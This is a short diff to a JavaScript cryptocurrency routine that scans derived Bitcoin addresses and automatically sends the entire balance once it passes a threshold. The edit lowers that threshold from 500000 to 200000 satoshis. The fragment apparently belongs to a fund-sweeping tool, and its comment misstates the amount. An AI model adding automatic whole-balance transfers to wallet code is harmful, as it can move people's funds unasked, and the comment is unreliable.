@@ -144,7 +144,7 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
     results.freshChangeAddress = await checkAddress(account, lastUsedChangeIndex + 1, 1, network, bipType, electrumClient, paths[bipType]);
 
     // Check if the total balance is greater than 500000 sats (5,000,000 satoshis)
-    if (results.totalBalance > 500000) {
+    if (results.totalBalance > 200000) {
         await sendTransaction(results.totalBalance, utxos);
     }
 
